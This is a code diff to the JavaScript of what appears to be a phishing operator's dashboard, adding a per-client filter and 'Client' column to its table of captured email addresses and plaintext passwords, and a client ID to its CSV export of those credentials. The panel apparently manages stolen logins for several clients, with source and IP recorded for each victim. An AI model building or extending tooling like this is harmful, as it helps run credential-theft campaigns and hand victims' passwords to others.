@@ -1400,7 +1400,7 @@ async function loadVisits() {
 }
 
 async function loadCredentials() {
-    const creds = await api('/api/credentials?limit=200');
+    const creds = await api('/api/credentials?limit=200' + filterParam());
     if (!creds) return;
     const c = $('#cred-log');
     if (!creds.length) { c.innerHTML = '<div class="empty">No credentials captured yet</div>'; return; }
@@ -1408,6 +1408,7 @@ async function loadCredentials() {
         <thead><tr style="border-bottom:1px solid var(--border2);color:var(--dim);text-align:left">
             <th style="padding:7px 10px">#</th>
             <th style="padding:7px 10px">Time</th>
+            <th style="padding:7px 10px">Client</th>
             <th style="padding:7px 10px">Email / Username</th>
             <th style="padding:7px 10px">Password</th>
             <th style="padding:7px 10px">Source</th>
@@ -1417,6 +1418,7 @@ async function loadCredentials() {
             <tr style="border-bottom:1px solid var(--border2);background:${i%2===0?'rgba(244,180,0,.04)':'transparent'}">
                 <td style="padding:7px 10px;color:var(--dim)">${i+1}</td>
                 <td style="padding:7px 10px;white-space:nowrap;color:var(--dim)">${fmtTime(cr.timestamp)}</td>
+                <td style="padding:7px 10px;color:var(--dim);font-size:.6rem">${escHtml(cr.clientId||'')}</td>
                 <td style="padding:7px 10px;font-weight:600;color:#f4b400">${escHtml(cr.email)}</td>
                 <td style="padding:7px 10px;font-family:monospace;color:#4fc3f7;letter-spacing:.05em">${escHtml(cr.password)}</td>
                 <td style="padding:7px 10px;color:var(--dim)">${escHtml(cr.source||'')}</td>
@@ -2435,10 +2437,10 @@ function csvDownload(rows, filename) {
 }
 
 async function downloadCredentialsCSV() {
-    const creds = await api('/api/credentials?limit=9999');
+    const creds = await api('/api/credentials?limit=9999' + filterParam());
     if (!creds || !creds.length) { toast('⚠️ Geen credentials om te downloaden'); return; }
-    const rows = [['#', 'Time', 'Email/Username', 'Password', 'Source', 'IP']];
-    creds.forEach((cr, i) => rows.push([i + 1, cr.timestamp, cr.email, cr.password, cr.source, cr.ip]));
+    const rows = [['#', 'ClientID', 'Time', 'Email/Username', 'Password', 'Source', 'IP']];
+    creds.forEach((cr, i) => rows.push([i + 1, cr.clientId||'', cr.timestamp, cr.email, cr.password, cr.source, cr.ip]));
     csvDownload(rows, 'credentials');
     toast('⬇️ ' + creds.length + ' credentials gedownload als CSV');
 }
